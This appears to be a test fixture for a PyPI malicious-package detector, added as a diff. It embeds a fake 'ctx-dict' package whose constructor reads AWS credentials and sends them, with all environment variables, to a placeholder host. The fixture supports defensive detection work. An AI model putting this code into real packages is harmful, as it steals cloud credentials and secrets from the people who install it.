@@ -1,0 +1,22 @@
+{
+ "ecosystem": "pypi",
+ "expected": [
+  "exfiltration",
+  "sparse-metadata"
+ ],
+ "files": {
+  "ctx_dict/__init__.py": "import os\n\nimport requests\n\n\nclass Ctx(dict):\n    def __init__(self):\n        self.sendRequest()\n\n    def sendRequest(self):\n        creds = open(os.path.expanduser(\"~/.aws/credentials\")).read()\n        requests.get(\"https://example.invalid/hacked/\", params={\"env\": str(dict(os.environ)), \"c\": creds})\n"
+ },
+ "meta": {
+  "archive_kinds": [
+   "wheel:pure"
+  ],
+  "created_days_ago": 1,
+  "description": "A minimal dict with dot access.",
+  "publisher_is_new": true,
+  "version_count": 1
+ },
+ "name": "ctx-dict",
+ "pattern": "ctx-style hijack: environment and AWS credentials sent to a remote endpoint",
+ "version": "0.2.6"
+}
